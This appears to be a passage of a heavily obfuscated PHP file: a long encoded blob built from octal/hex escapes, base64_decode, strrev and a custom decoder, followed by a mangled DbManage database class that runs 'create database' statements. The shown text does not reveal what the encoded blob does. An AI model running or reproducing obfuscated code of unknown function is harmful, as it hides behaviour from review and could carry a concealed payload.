\103\115\24\207\17\203\121\331\7\3\62\314\173\203\230\46\200\347\271\200\274\224\164\171\227\370\72\134\155\360\315\256\120\236"."\131\221\33\301\371\255\70\304\2\250\362\56\270\353\313\51\31\172\321\14\357\30\203\154\215\3\115\162\14\344\225\224\43\237\113\71\122\152\322\21\313\346\35\246\232\114\302\177\34\140\14\35\371\170\302\141\14\247".strrev('•½¢„Õ‡Å¯C?ƒ&'."\0".'<µ#ë€$§#ˆúr€Hî¸‰ÄLé=:×®Gõ<±(ŒuRJ').base64_decode('oWUKSBlsdBI42ZFxyBJLL/g62qtdS4IsddQxSYK9mKXfW8yYpZil9mLExHbqSH4eHhIax8+QyRnomA==')."\236\374\67\232\315\273\340\37\22\43\24\210\350\100\143\76\17\372\176\20\24\67\134\24\21\335\122\215\161\141\104\323\125\40\31\313\245\53\342\267\47\32\132\322\34\141\32\144\42\152\210\244\10\165\43\25\141\51"._kodDe('K2EXVgdNTdyU6VRCQyg/U/YhErBmL0HzjTdhw+ZJA3U7czNDEJw67OQKL6yx69mLbFPbUGOkEQSYpxU=')."\115\202\322\23\4\224\3\147\7\55\14\36\214\106\341\271\250\320\262\171\56\137\147\173\320\205\312\103\66\223\374\333\360\72\126\27\175\33\340\217\62\1\233\41\246\62\132\114\316\104\161\31\374\256\117\316\1\256"."\xc2\xdc\x64\xcd\x73\xe1\x38\x28\xcd\x65\x4d\x49\x51\x6d\xad\x8c\x96\x4b\xa9\x66\x21\x61\x6d\xd3\xfc\x40\x8\x55\xa5\x0\x32\xb8\x6c\x28\x19\x50\xde\xf\x64\xb0\x60\xc8\x99\x1f\xc2\xb7\x62\x24\x94\x61\x35\xae\x74\xcb\x83\x25\x8\xa"."\102\51\311\144\31\6\316\301\171\274\45\7\74\134\141\131\370\173\122\210\371\266\263\223\101\61\213\217\46\301\343\160\320\165\64\67\312\222\340\160\241\40\217\300\102\305\242\60\153\245\5\210\214\66\16\70\43\65"."\76\365\0\102\203\352\111\35\342\316\203\24\323\346\357\16\364\206\275\355\256\222\110\24\50\134\140\210\124\131\42\31\236\106\203\235\71\72\217\234\44\327\44\50\110\135\15\24\306\117\120\305\114\305\251\35\120\235".base64_decode('VdR2FNGLEgWAL1c3M5vtUDMlFqLvQQNJBaMddDA3Q7L3YQkUX8iPGgpWKf5IsPjFkgiL06qptMqZog==').strrev('¥€pÏà’0‘ĞnZb;¬<‡ug!Ár4ÂrÇ($Ä,$]â„T£$ÆÊªÒ©ã¾©bV¸w´©Å,¡O')."\x26\x27\x33\x0\x31\x23\x3b\x32\x80\x81\x39\xb2\x6a\x42\x75\x64\x41\x40\x35\x1d\xa3\x59\x87\x51\x97\x25\x8b\x70\x36\xf\x12\xf3\x75\xe\x2d\xa9\x3b\xf4\x41\x50\xa4\x91\x86\x73\x63\xd0\x31\x22\xf\x3b\x46\xb2\xb2\x23\x3b\x43\x76\x68"."\251\224\143\170\50\351\30\31\166\14\153\161\207\111\217\220\251\230\24\65\104\25\310\241\202\32\37\204\140\27\374\7\214\113\66\157\104\13\71\165\224\172\147\317\152\332\260\224\35\116\47\176\10\37\253\121\333\361"."\261\120\2\370\236\256\31\203\262\13\251\142\51\272\175\71\142\351\175\4\141\2\352\52\202\321\226\363\171\7\20\150\22\140\333\211\214\207\373\355\71\171\175\372\330\52\110\365\275\242\120\122\23\163\340\312\320\117".base64_decode('YDlB0G2BiXjliuqWU3TmNgUep4giKhG5QHHUAxBeGQWLB4wy2cpo/7wF1Afk7eGaCfhv7YQMeOuwpg==').base64_decode('x1SDPrrFmt4vCps/PpPIDP+HXFw+TSk5/X/+qpBpTKEWRz8+O88DOooavP8PHQUzRcX37wiS4cqrcQ==')."\310\251\135\325\56\176\355\202\304\32\72\367\146\200\131\72\354\110\316\200\123\155\30\114\263\141\107\126\33\6\63\132\165\350\331\341\230\43\73\70\14\2\120\146\316\202\171\10\302\12\20\11\215\221\44\231\273\165".base64_decode('qVpHXSrvkMHEj6mAA6jDSUfOGHaA2Q/+P2KC4sBvFsgiWSihZ4GoPqzFKNuBmsYuLQdfmYBvMLhG4A==')."\xd1\x9d\x63\x32\xe1\xba\x18\x3f\x8d\x4e\xde\x8a\x33\x50\xc3\x8a\x1f\xcd\x6\x1c\xd6\x9\x1b\x27\x87\x6a\x51\xc1\x28\xe3\x47\xb3\x8\x5b\x59\x38\x59\x28\x9\xd7\x16\xed\x61\x84\x19\x39\xcf\x45\x5a\x81\xa5\x44\x98\xe0\x60\xf2\x27\x47"."\43\231\341\215\115\74\232\321\264\301\102\136\140\5\70\25\357\262\15\127\137\165\315\104\115\277\213\117\357\37\302\304\305\376\20\26\142\14\2\22\357\31\214\216\322\243\337\137\105\362\45\41\303\4\337\103\162\276"."\311\371\345\204\310\57\47\10\263\353\267\10\277\166\342\140\134\27\46\300\116\240\147\241\344\267\210\353\366\351\140\317\50\316\253\22\273\7\42\162\121\146\114\254\202\15\113\105\330\344\373\36\54\33\233\267\60\167"."\13\213\316\262\305\333\262\23\56\2\243\101\301\341\42\176\256\307\323\52\275\227\102\27\44\134\360\57\344\350\326\100\111\10\362\76\310\220\111\350\112\116\170\36\11\264\10\354\320\240\313\31\6\2\235\310\337\100"."\201\137\155\160\273\261\352\71\334\216\317\205\306\140\365\63\10\247\220\5\155\57\215\11\60\150\56\341\340\374\56\177\253\7\71\221\210\166\372\351\173\342\115\115\315\206\170\201\226\6\344\344\4\365\110\261\167\73".strrev('ñx´œz0Ğ-Û¸y–úâéÃĞT@(8'."\n".'w'."\r".'éê g@‘ÅFÙ±ÈÀ®Ç-%RD¡B‰„p“T:Ë').base64_decode('Yic8joeGNnH05norTJQgn8w2lQ1qiXhGKyTKeIHuGle1NKO6RurNUcVTunsK6HIqK8PnK53C65ZtMA==').strrev('VİŒ©ä®Òı¦÷CqÈónŠÑ·oÉÊGĞOX.ŠÃı°l(T'."\0".'õ°qÆM{‰8ãôÎËDö*zÃlè')."\xf4\xfa\x35\x52\xd8\x19\xcd\x66\xe6\x32\x75\x20\xe1\x10\xb5\xb1\xbd\x21\xaf\x6b\xf9\xa4\x9a\x4b\x48\x0\x27\x67\x34\xb4\x37\x95\xb5\x7b\x16\x35\x94\x35\x83\x24\x39\x93\x81\xa9\x92\xbb\xb9\xd1\xcd\x11\xc9\x8\x6\x82\xfe\x40\x87\x8f"."\271\344\10\300\41\41\247\151\130\43\333\351\45\23\211\174\312\242\67\137\6\172\276\214\353\315\227\241\72\225\111\324\101\37\262\104\302\301\32\352\353\124\264\23\46\32\251\320\376\116\350\7\30\145\326\72\210\140"."\332\275\320\363\202\100\56\151\166\150\156\63\21\301\100\142\272\330\51\232\56\202\216\200\313\31\274\227\207\275\12\73\46\16\225\224\320\44\302\135\143\111\147\271\122\212\111\156\157\21\34\326\56\341\206\313\224\63".base64_decode('oeoKcpYDM9vQSn6U6lohrw2CA8WCMOkVwdKaW4nHmOEGKBJd79kGmkRDTWXEtJHOE8g7y5oxm2wMNQ==')."\50\243\160\120\101\223\233\375\350\245\361\36\315\104\312\126\215\156\61\15\40\22\25\340\146\66\134\20\203\2\121\161\260\325\250\52\315\126\242\205\333\373\6\211\75\23\317\51\266\140\46\11\301\56\222\365\261\6"."\xa9\xc4\x73\xf3\x99\x92\x3a\xf7\x26\x2a\x91\x30\xb5\xee\x70\xc9\x49\xc\x4d\xb0\x40\xd5\x9a\x66\xd7\xcf\xa8\xae\x76\x64\xb\x86\xe9\xd4\x15\xeb\xb3\xbf\xb0\xa3\xa4\x5a\x32\xef\x42\x4e\x3c\xd1\x9d\x8b\x54\xc0\x1f\xda\xa9\x45\x39\xf2".strrev('„kd&ô‡\\¿ÁíêC·= îyƒ$ó‚CƒÅ°‚÷'."\0".'0Şù¤:±éÖÜ\'€¡Àüèà‰‘ ĞĞ')."\xba\x12\xc4\x21\x45\x53\xa2\x71\x93\x28\x49\x82\x33\x16\x2a\xe5\x90\x5e\xc7\x0\x3a\xa2\xd9\x86\xc5\x6a\xae\xae\x16\xaa\xb0\x63\x6b\x2a\xb8\xad\x27\xc4\x0\xb8\x65\x41\xcf\x35\x60\xbf\x52\x86\x33\xab\xc6\x81\x10\x0\x16\x60\x27\x20"."\x89\x6\xa8\xf9\x67\x2d\x83\xde\x7b\xfe\xdf\x4b\x80\xb5\xa0\x7a\xf4\xff\xf7\x52\xa0\x4a\x85\xc7\x4\x8b\x4e\xac\x60\x2a\xc6\xff\x54\x6\x65\x70\xac\xab\xb0\x32\x53\x33\x59\x25\x6a\xa4\xda\xea\x6a\xc9\xbf\x0\xa2\x91\x94\x7d\x84\x5c".base64_decode('tJMJL8Djg8eEqHEk5GH6sHAaTjI1l6cONRGjAgMfXBxkTvU063IQtnBr0rAE5dRktKEJQALuSUDeMQ==').base64_decode('1g641g8rMI12FsbErCzRgL6CuRgDWxBBgRgTTPJMwQCFcWycxtATcB1qVnPwHWIT8TYMYQjaSE6hkw==')."\x1e\xe6\x87\xe6\x86\x6e\x4\x74\x73\xc6\xc\xf3\x61\x44\x96\x8f\x38\x20\x6d\xf6\xe1\xa2\x15\x88\x42\x61\xd6\x56\x41\xe3\xb2\x66\x3a\x2b\xb4\xbc\x3c\x54\x50\x18\xbc\xc1\x36\x4b\x58\x9b\x51\x26\x46\x6\xb6\x1e\xa3\x58\x96\xae\x65\xe4"."\202\213\204\317\373\71\303\350\33\234\1\345\360\12\321\40\101\57\323\116\300\117\206\213\130\162\21\55\300\1\235\224\47\116\272\210\177\357\312\212\165\177\351\302\212\210\15\7\227\70\275\243\171\120\107\45\1\126"."\x6a\xb0\xbf\x1f\xb3\xd8\x2d\xbb\x97\x63\x83\x15\x7c\xcb\x57\x55\xe9\xa4\x1\xe6\x50\xaa\x95\xf0\x43\xfc\x33\x8c\x96\x29\xc2\xa4\xa1\xf0\x4a\xc2\xc3\x60\x3e\x40\xcf\xb3\x89\x1a\x3b\xa0\x96\x62\x6b\xc9\x24\x3c\xbd\x20\x31\x82\x85\xb6".strrev('„ºç¡Ñ<	6>tÖA[>•ægŠ=V/p²iPÈÍd\\f$^QV@Æƒç#>XÒ[Ş4Ÿ')."\x57\xb3\xf0\x46\x52\x66\x95\xd4\x81\x84\xf\xb8\xd1\x20\xc5\x49\xe9\x8a\x92\xb3\x40\x62\x99\x82\x62\x1\xc8\x99\x7c\x5a\x46\x10\xc\x20\x6f\x78\xb4\xc5\xdc\x6d\x29\x77\x9b\xee\x6e\x23\x3b\x73\xf2\x8e\xdc\x6e\x24\x99\xac\x5a\xc4\x27"."\27\175\371\3\65\20\157\274\241\23\237\224\232\54\11\207\133\207\222\11\171\52\325\215\160\5\237\264\240\172\3\317\60\243\320\270\50\312\217\72\212\56\225\120\231\101\315\144\313\254\360\21\170\43\216\56\76\10".base64_decode('s+Dv0EKcZIZqifm650c7unyBKNoX+HvCni5bAmCsYV9bEbjVT50K25oWy1q12NQckgUC3GcRiMoGcw==')."\xaa\x4b\x7c\x55\x92\x3c\xd0\xdc\x0\x7\xe7\x36\xc6\x74\x37\x35\xe9\x8c\x9\xbb\x24\x23\x2b\x67\x98\x92\x94\x9b\xaa\xc0\xbb\x8d\x2\xe\x51\x3f\x37\x5d\x3e\x32\xc1\xdc\x64\xcf\xd8\xa5\xc6\xa8\xc5\x54\x5b\xd7\x32\xd0\x4\xe8\x8e\xc4"."\37\364\4\227\162\227\311\40\45\354\11\116\222\2\363\20\57\205\324\161\336\334\171\363\346\321\227\145\343\31\154\3\12\315\16\330\35\74\200\302\23\55\245\30\52\27\143\102\255\76\144\70\145\271\303\17\312\272".base64_decode('B7egROIyNT9Jopqn74LmqeZ7vhDDIZMd0QnOh2aR31HyGxsntC/rRB8hLpP8qkHO3FLjUJ2OhsFylA==').base64_decode('4WejSE+5X2qTc+Wm5Adoc6VuaC2VS0njoOXYX7bBXZgYaSWTiUI1OlLdeFqT7LtOGp38G7wYAi5QHQ==')."\20\310\141\101\5\311\314\43\323\135\320\40\340\276\71\210\325\242\313\105\24\203\240\113\7\300\161\254\110\310\65\52\365\325\200\216\42\242\200\31\12\36\64\241\70\45\301\365\7\131\126\130\234\362\54\320\22\144"."\330\32\260\47\236\204\62\72\127\102\156\246\210\327\363\322\236\235\320\147\44\360\31\150\217\46\141\113\142\213\322\41\106\50\202\64\130\164\27\161\102\161\205\247\126\327\124\13\126\42\276\66\157\50\172\142\10\72"."\143\355\362\121\47\77\326\4\37\110\13\7\47\111\361\4\47\113\361\267\236\70\111\112\33\335\144\130\123\272\374\376\220\350\117\312\126\275\336\200\340\201\222\154\242\341\2\137\103\24\111\173\172\273\10\377\212\20"."\12\216\20\206\335\106\124\246\42\205\251\325\63\250\1\21\177\51\25\366\115\124\170\350\34\37\303\341\260\206\266\161\70\54\305\145\154\150\23\123\260\350\240\44\240\367\131\130\73\311\0\2\65\145\367\47\100\327"."\322\156\167\205\153\172\345\224\23\262\42\54\122\5\201\221\52\367\11\275\244\32\47\160\30\100\230\302\340\356\345\25\145\23\345\225\256\252\212\110\115\45\123\11\213\120\3\266\110\244\100\24\252\372\127\314\130\311"."\x1d\x5d\x46\xfa\x5c\x55\x91\xfe\x29\x82\x86\xda\xa\x0\x58\xc9\x0\x23\x69\x7a\xc6\x86\x5c\x6c\x30\x2c\xa3\xaa\xa2\xaf\xac\xbc\xdf\x55\xd5\xb7\x3c\x12\xe9\x87\xc1\x4a\x0\x6b\x80\xf0\x48\xc8\x55\x55\xe9\x68\x99\xe2\xee\x55\xd\x11".base64_decode('H7vrnhSHdDk1YcuzCwMo16hgK4WsM0Qd3YAXMGXBR5+ZzQtki8/mRGV3DCFMC6rfCkFqEJbnSv9WBQ==')."\135\26\265\314\226\152\251\25\310\163\26\263\155\213\43\101\241\166\372\164\241\240\250\350\247\23\101\304\27\127\140\134\170\230\127\250\53\20\352\4\357\63\260\40\352\262\11\303\240\17\207\111\334\25\141\317\41\240"."\1\102\235\260\23\112\170\52\100\213\4\13\155\247\315\367\27\331\153\25\367\41\16\3\102\46\123\13\341\201\117\241\315\17\165\250\302\365\314\107\142\244\7\140\37\107\155\37\144\66\341\31\141\317\332\156\225\141"."\270\146\27\215\122\71\52\56\347\341\35\120\2\237\266\203\216\47\337\146\241\336\0\364\270\7\71\101\224\36\274\12\40\137\217\57\32\362\55\363\26\45\100\307\323\245\123\300\172\37\366\121\361\107\200\367\370\221"."\223\73\13\274\267\147\101\217\177\161\51\324\160\167\200\313\22\102\122\233\247\47\34\25\66\256\170\107\3\366\145\154\113\103\225\340\343\172\274\256\66\306\246\31\163\376\106\5\176\62\123\360\217\350\313\141\324\311"."\154\2\350\246\250\235\273\140\41\331\320\151\55\251\2\162\110\103\62\210\107\75\142\262\103\52\171\320\303\166\135\304\70\304\166\206\31\123\163\62\165\235\233\245\337\316\62\13\73\350\225\212\172\362\101\326\160\124"."\62\20\357\303\363\354\122\221\230\240\351\40\125\107\126\344\302\301\136\316\14\52\51\61\332\245\61\75\100\264\232\227\50\2\276\160\44\30\257\300\235\214\47\156\26\304\327\223\270\255\72\214\315\347\76\140\5\323"."\x3f\x67\x8d\xc4\x5a\x14\xc5\x25\xe3\xc8\x74\x21\x1\x6b\x9f\x97\x30\x1f\xb4\xb9\x6a\x10\x3c\xc8\x22\xb3\xf5\x50\x21\xc6\x1c\xee\xd8\xec\xfd\xa8\x7f\x5a\x49\xb4\xb4\xa3\x5e\x66\x61\x1\xe8\xf1\x1f\xd8\x2\x43\x4c\x3\xc5\xc2\x87\xb8"."\171\313\304\54\350\233\105\131\160\32\64\210\343\254\114\114\61\240\222\127\57\25\273\112\245\224\370\24\112\22\172\64\116\67\173\324\211\36\351\44\336\127\46\355\357\132\147\35\361\306\42\272\251\45\346\164\244\163".strrev('AÑµÉPô:”ÓŒLXŒ\'¢ĞØ‰— ·áï	Ûª	‹ ÑÇÑr7X,÷^@’µ')."\275\245\322\161\147\301\344\166\213\77\121\33\2\230\362\326\164\364\105\261\62\111\374\36\224\305\257\242\255\20\35\247\265\53\334\373\11\312\305\333\301\135\263\2\20\330\373\240\133\32\336\61\334\151\36\176\363\210"."\72\220\365\44\22\166\160\130\143\300\142\307\173\56\346\372\226\370\370\7\233\322\220\317\337\123\121\11\245\54\213\253\202\356\61\346\205\35\214\44\132\307\273\345\121\76\120\54\102\123\31\235\32\226\10\366\145\151".strrev('¡}ÛÇî?Ë©qªÉ%ºO{˜ÚG'."\n".'ªØ#¬ÈŸ¨XäøkãîbnÒµ7ºí™!Dk@ÍÉ')."\5\122\112\61\45\56\10\241\333\15\353\314\107\36\47\320\151\40\45\374\30\125\225\101\101\47\72\71\161\132\174\33\261\135\212\350\367\23\26\124\124\60\36\165\261\70\170\354\342\114\60\143\134\33\56\25\34\212".base64_decode('cojfF/LAXY6VVyAw2f9YyxlT4AVC6W8XSnyX4Gf4oYuQQc0Nq4bK2QDtqjERn/sEKepV1CgBFfo84w==')."\266\352\254\203\331\27\213\154\250\171\34\343\220\127\324\4\153\135\74\70\342\153\202\171\352\357\206\134\332\123\112\40\121\341\376\73\257\313\252\241\10\0\313\133\203\4\77\212\261\60\54\350\233\337\31\376\321\305".base64_decode('qQn+bqCtMmqCyovMxTiQElF5WBfIUgWo7sA5ha/dgR544z5rURBIlA54wIUq4BCe2kV3y2QSqRoyiw==').strrev('ëĞÕY²ØF°ƒäaw¥;•ŠÜ#±õ/jÃ\\É2znJo–lŠbdIÉ¶ê8¹ÃñGóæ Ö%').base64_decode('INQClljls0bhqN1Vb1qUpovKgrL25OWAfBI3+mcIUpNUjXxHcJerUiN9+IB/Aj0S583m6buh2Ei7Uw==').base64_decode('NfgDJkjY4JsqKMFp2bEigMULQBetBvP8Cg1ccklNbDVicmCtcKCAF3AVHMJW4A54Om4GEEV1KcOKtQ==')."\x9c\x49\xb\x35\xec\xcb\x4\x97\x5e\x0\x3b\x80\x76\x2b\x5c\x75\x9a\x42\x4\x59\xc5\xc2\x78\x51\x44\xa0\x5c\x64\x47\x2b\x3c\x17\x40\x7f\xa1\x5f\x1f\x26\xd3\xc2\xfa\xa\x5\x12\xeb\xab\x8\xf9\xa5\x3c\xd6\x5e\x34\x18\xc9\x36\xa2\xdd"."\102\111\36\106\213\22\273\25\256\116\107\352\352\260\55\33\320\145\236\234\143\34\12\216\47\100\302\56\225\100\200\317\52\232\46\220\17\363\136\305\166\254\310\125\55\73\271\6\253\167\30\160\270\224\3\313\37\220".base64_decode('N/BY65gYFn0Ao3qFmdGOmmAjJN7mO2kq1FWjHIKTL04VyJmxHTE3NhUIYqeaLuyUBKfoYBvBPOda0A==')."\10\323\0\133\55\176\350\152\163\237\203\201\304\225\116\41\347\303\217\75\130\240\272\260\115\21\275\60\143\247\74\334\217\76\101\7\137\13\140\107\102\244\331\142\221\324\231\23\372\201\33\31\60\143\231\211\271\273"."\330\371\23\164\372\111\146\243\350\44\227\370\344\162\211\373\10\202\40\65\112\174\200\55\23\10\212\151\160\126\242\0\232\225\242\260\131\32\152\231\225\10\205\221\34\172\316\223\121\37\354\121\362\323\256\44\231\30"."\16\343\174\277\46\76\165\203\311\310\303\144\26\132\70\372\205\234\321\201\33\347\140\224\256\32\135\110\347\323\10\141\151\324\1\357\107\301\17\336\121\30\16\376\44\202\3\337\165\40\103\43\73\235\145\270\7\56"."\320\325\274\161\260\246\141\261\241\26\51\330\56\0\263\336\262\145\10\332\173\64\254\25\373\276\340\136\257\162\205\54\167\64\6\42\326\15\101\121\203\205\26\26\364\214\3\151\54\73\350\333\217\266\356\20\352\20"."\65\205\66\62\341\323\66\122\45\172\367\7\113\47\336\224\221\374\17\344\47\354\77\4\47\65\240\273\241\322\150\252\205\44\301\6\234\237\272\343\267\142\363\366\305\141\151\66\121\133\67\163\216\270\345\346\43\307".base64_decode('3RLV4h+iTUVPFxktSBMWSpPoA7XipEaJVqfQ5ElhganbmO+PmgmeUtI5ziQcArKScRewgNAXiFAFfw==')."\204\302\232\144\163\70\247\101\33\176\203\177\30\257\53\174\72\133\277\205\76\121\252\105\377\367\66\43\60\237\141\250\335\320\203\240\13\5\125\370\16\240\155\163\122\274\327\301\145\322\35\3\364\377\313\143\126\257".base64_decode('feRYgCcLewKxRFOzH2/A7HDJQ68z+HMZssbCu1I+V3k/4udjf3y3UKEf7xu468ISveCeR3kTaLW4Iw==').base64_decode('ka0O3r6nDVjUYh4AnLLpFEhbOB5TTD8iEBwVdqC2AgEiz9XvkCZDEgiRP2snSFUQ10Olj9IbS8rguA==')."\xca\x1f\x7a\x2f\x83\x7b\x9c\x41\x73\xd9\x32\xaf\x85\x7\xa2\xc5\xe7\x27\x50\x41\xe2\x34\x29\x2e\x1a\x9d\x6c\x90\xfa\x92\x89\x8d\x74\x47\x90\xf\x47\xcf\x7c\xf6\xa2\x8\x24\x3\x5e\x5\x2b\x51\x98\x1a\x4f\x31\x35\xeb\xa3\x46\x7e\x7a".base64_decode('PgyEK8vWCcS5zZ7AnhI2IO0BxAk4uwNsSBW2P0Sm57IxaqjgTYscvvCe8pC5lHCIz2KDKCNmsvQSBg==')."\211\374\172\343\317\12\53\53\255\135\112\10\365\120\263\26\30\21\216\36\321\126\203\45\246\305\135\10\174\224\15\207\250\50\315\152\201\26\203\122\363\12\127\2\22\45\131\336\121\220\56\100\120\357\35\231\233\303"."\x3c\xa5\xf8\x28\x6e\xd0\xf7\xc8\x8\xb0\x38\xe6\x57\x7e\x3e\x91\x71\x6d\x95\xb3\x2e\x77\x7b\x8b\xa9\x84\xa8\x1c\x96\x18\x89\x70\x99\x1e\x19\x10\x8\x17\x97\x28\xce\xfc\x7\xd3\xc7\xf5\xe8\x9b\x7b\x32\xf3\x6c\x4\x5d\x42\xb1\xad\x3b"."\x3e\xd8\x24\x28\x99\xc\x5f\x5a\xc5\x47\x8f\x32\x31\x59\x77\x1\xe2\x1a\x34\xa9\xb\xbd\x52\x11\x51\xae\x2f\xb1\x5b\xa4\x22\x27\x6f\x40\x4e\x8d\xf\x96\x70\x99\x5\xbb\x1e\x6a\x8b\x9\xab\x9a\x20\xb\x14\xa1\x71\xd6\x2\x44\x6\xa6"."\xe5\x49\x43\x68\xb3\x4\x5\x48\xca\xc3\xc4\x97\x66\xfc\x4c\xb1\xa1\x92\xb0\xcd\xfe\x79\x94\x17\xc0\x9\x48\x4f\x47\x45\x36\x60\x1\x15\x31\x8f\xb0\x65\xc9\xb3\x0\xc5\xee\x21\x44\x0\x5f\x71\xa0\xf4\x60\xc9\x1\x5d\x6c\xb5\xa\x3b"."\x14\x8c\x44\x5f\x56\x25\x1e\xd1\x4\x6e\x55\xec\x41\xad\x38\x37\x9b\x8e\x62\x96\x28\xa8\x98\xf5\xc0\x44\x2c\xa\x2b\x1f\xc0\xd\x7d\x10\x6e\xb9\x5d\xb6\xe2\xd8\x7c\x29\x39\x47\x54\x3\x1f\x2a\x8b\xfb\x4a\x10\x12\x2b\x46\x27\x59\x40"."\327\220\200\144\205\262\23\2\301\260\116\320\142\13\331\331\224\355\240\33\154\145\204\113\40\374\32\255\252\41\135\15\117\110\2\314\112\12\365\166\127\40\367\373\20\0\3\370\105\303\223\210\274\166\222\264\217\44"."\xfc\x87\xdf\xb5\xac\x80\xc9\xb0\x90\x93\x24\x5f\xf\x7f\x59\xbc\x52\xe2\xef\x31\xe2\x74\x42\xad\x40\xc2\xef\xd0\xd8\xb8\xc3\x4b\x6d\x41\xff\x69\xfb\xad\x97\x6c\x5f\x75\x23\x7e\x5c\x1b\x3f\xb6\x4d\xfa\x9\x3f\x2f\x22\x22\x89\xc9\xd6"."\x37\x48\xa0\xdb\x70\xeb\x54\x69\x2e\x85\x16\xd7\x74\x43\x40\x13\x5e\xd9\x59\x8\x5f\x53\xc0\xc1\x6e\x35\x47\x9f\xbe\x21\x33\x80\x66\x2f\x55\x24\x20\x91\x90\x69\x19\x4c\x28\xc\x53\x9\x1c\xec\x31\x24\x3e\xf4\x68\xd7\x8c\x37\xc2\x96"."\375\60\321\40\23\101\302\175\30\264\245\260\372\107\106\211\10\114\337\272\45\45\10\327\70\326\13\65\215\256\242\105\34\255\240\166\11\311\50\27\175\66\21\374\302\27\111\174\334\67\11\112\306\207\314\236\141\231"."\151\127\331\163\365\132\166\26\302\365\133\34\221\56\337\361\241\214\61\120\113\364\217\47\257\332\163\230\151\125\117\264\252\271\204\35\277\220\213\61\50\107\7\203\321\132\12\14\304\62\316\324\155\160\141\375\341\154"."\x55\x1e\xe6\x57\x31\x5c\x3e\x4e\x24\x3a\xe4\xe1\x12\xa8\xcc\x93\x0\x83\x2\x8\x43\x45\x12\x92\xf0\x70\x12\x77\xac\xad\x8c\x88\x5f\x27\x78\xc9\xe2\xd5\x7\x22\x16\x43\xf9\xc3\x4a\xf6\x76\xa1\x9\xc7\xe0\xe4\x46\x2c\x27\x78\x1c\x24"."\344\306\101\10\47\316\234\121\12\233\14\250\234\311\275\124\342\72\262\235\70\377\244\365\375\47\206\306\244\67\200\203\214\54\234\26\250\155\253\5\217\147\351\72\154\113\42\307\0\102\361\45\117\13\54\244\320\45"."\x14\x27\x5e\xc0\x4d\x9a\x21\x54\xfa\x23\x9c\x5e\xad\x5d\x2c\xbc\x95\xc5\x13\xe8\x72\x27\x96\x62\xe1\xc2\xac\x61\x4\x33\x28\x26\x5a\xaa\x63\x1f\x5a\xb4\xb\xe0\x74\x89\x81\x59\x74\xe4\xe9\xa2\xa7\xc5\xc5\xf8\x8a\xad\xf6\x62\x6\x7b".base64_decode('y3AOvah/SJ7Sn7Z/gHaPfW/FCxH2OEV382GtRB5co5LZcBLMyeU5S15jRDXj6ZJ5cRLMW5RMMwuHGg==').strrev('	JiÅ/r»mZO"J-Y2¨y(µÒû›FÇcÄ#ŸÅÈ’Ïë\'Q‹m+ˆ½^Èó¸¯4“.S>B')."\16\310\157\310\213\171\55\117\53\161\137\217\313\204\13\161\320\242\322\132\224\54\136\376\227\126\17\10\226\234\305\206\365\336\336\6\27\73\206\373\70\45\136\117\7\163\324\115\30\310\316\335\157\102\115\170\217\156"."\357\234\11\42\5\332\34\132\123\332\313\25\4\47\312\45\75\142\73\340\306\270\170\347\231\241\116\344\104\177\341\170\217\242\231\152\134\320\23\202\100\321\345\65\116\247\37\311\360\263\65\42\11\340\203\232\166\121".base64_decode('7f39u0/fed8NOzdcvfOCM7ZfeIljx5rrd1x+1o7Lz91+9tXbf30jTthxxakf/PqCudKOs06GievOfA==').strrev('=ÑÉà^;IÅµñø¹Ÿùœµ…ßM]¬v«úÇg¾¬wâó¿]·ûïvß¶Qˆœ€['."\r".'ı÷»¯Û¿ñ»şï')."\xbe\x61\x43\x8a\x61\xec\xd6\x6\x6e\xd4\x1c\x78\xdd\xc4\xc9\x21\x4d\x37\xa1\xf3\x5\xc0\xef\xf3\xe8\xb7\x55\x33\x4d\xca\x86\x80\x78\x8d\x30\x91\x18\x88\x7c\x3b\x9\x2a\x7\x20\xc4\xaf\x68\xe0\x8\xa1\x5b\x3\x44\xcb\x88\xe7\xa0\x20".base64_decode('ueuDm9qQglMRp7JE4G0EiwSLrx06CrZbRg4A29GYNkpICb0SxesDbw9It9hFPa4QQGhZVKBAmoyGGw==')."\xa7\xb8\x89\xd5\x83\x13\x95\xe1\x24\xef\x99\x32\xad\x47\x92\x3d\x81\xe6\x1e\xf3\xe\xfb\x7d\x25\x90\xe3\x49\x5e\x4\x52\x85\xc6\xa7\x4d\x3d\xfe\x70\xd4\xbb\xc4\x17\xa\x87\x8a\x92\x2\x9e\x50\x68\xb1\x3f\xd8\x8e\x35\xa7\x8b\x92\x51"."\56\101\133\245\50\51\320\351\357\231\54\315\333\355\361\165\25\245\101\355\25\250\317\115\237\334\305\111\276\0\252\245\247\253\213\252\117\26\327\302\327\266\200\327\4\135\252\362\63\363\174\132\243\307\302\66\325\56"."\x7a\xc5\x10\x92\xe9\x64\x13\x5f\x99\x51\xb2\xec\xb4\x4b\x28\xc2\x7a\xf6\x20\xe\xb3\x41\x9f\x81\x66\x81\x7c\xd1\xe\x44\x10\x1e\xa0\x86\x49\xf\x29\x2c\x48\x1d\x9f\xf6\x78\x17\x72\xc6\xc1\xa4\x61\xd4\x20\x51\x7d\x8d\x5f\x1b\xbb\x2c"."\xd7\xcb\x2\x1c\x4d\x16\xc4\xbe\x4\x22\x14\x97\x66\x4\xa8\x2a\xd9\x63\xe2\x35\x70\xf1\x35\x0\x4a\xe5\x5d\x0\x6b\x7a\x22\x75\x75\x32\xa0\xc5\x84\x63\x7e\xcc\xd3\x2c\xdc\x4c\xd4\xa\xc2\x61\x92\xfc\xff\x1\xf8\xf3\x1f\x29\x4c\xc8"."\0\0"."", 10, -8))); goto EˆÃ¸ì„¼”; fÎ›é™”íÌ: class DbManage { function __construct($a®Úâº«¡Ö, $Aê˜­ôôñ© = '') { $this->database = $a®Úâº«¡Ö; $this->type = $Aê˜­ôôñ©; } public function model($fäØ‡ŸŸ”Î = '') { return new ModelBase($fäØ‡ŸŸ”Î, $_SERVER[Å¸ş][33], $this->database); } public function db($CùºˆÃŒİ× = false) { goto få«®„ˆ¯; få«®„ˆ¯: $CßÎ˜Şœ½ =& $_SERVER[Å¸ş]; $D„œºôÀœ = array_change_key_case($this->database); if ($this->type == $CßÎ˜Şœ½[9] || !$CùºˆÃŒİ×) { return $this->model()->db(); } goto DºÔ÷ò³»; Ešíƒİ·†µ: if (!$bÄæ¢ß†æÕ) { $bïÊÎø­à->execute("\x63\162\x65\x61\x74\x65\x20\144\141\164\x61\x62\141\163\145\x20\x60{$bŞµ¨åñÜÒ}\x60"); } $D„œºôÀœ[$CßÎ˜Şœ½[882]] = $bŞµ¨åñÜÒ; if ($D„œºôÀœ[$CßÎ˜Şœ½[725]] == $CßÎ˜Şœ½[726]) { $D„œºôÀœ[$CßÎ˜Şœ½[727]] .= 